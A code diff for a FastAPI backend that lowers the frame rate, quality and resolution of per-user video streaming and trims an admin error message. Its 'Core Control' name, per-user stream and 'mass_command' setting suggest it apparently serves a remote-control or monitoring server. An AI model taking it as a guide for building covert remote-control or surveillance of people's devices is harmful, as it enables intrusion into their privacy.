@@ -9,7 +9,7 @@ from pydantic import BaseModel
 import base64
 import time
 
-app = FastAPI(title="Assmar00 Core Control Backend", version="20.0")
+app = FastAPI(title="Assmar00 Eco Backend", version="22.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -59,9 +59,9 @@ def init_db():
     """)
     
     defaults = {
-        "stream_fps": "30",
-        "stream_quality": "65",
-        "stream_res": "720p",
+        "stream_fps": "15",
+        "stream_quality": "50",
+        "stream_res": "480p",
         "mass_command": "",
         "min_version": "1.0.0"
     }
@@ -103,7 +103,7 @@ def serve_admin():
         with open("admin.html", "r", encoding="utf-8") as f:
             return f.read()
     except FileNotFoundError:
-        return "<h3>Fehler: admin.html nicht gefunden! Bitte lege die admin.html in denselben Ordner.</h3>"
+        return "<h3>Fehler: admin.html nicht gefunden!</h3>"
 
 @app.get("/api/settings")
 def get_settings():
@@ -213,7 +213,7 @@ def video_feed(user: str):
                 _, encoded = cv2.imencode('.jpg', img)
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + bytearray(encoded) + b'\r\n')
-            time.sleep(0.01)
+            time.sleep(0.05)
     return StreamingResponse(generate_stream(), media_type="multipart/x-mixed-replace; boundary=frame")
 
 @app.post("/verify")
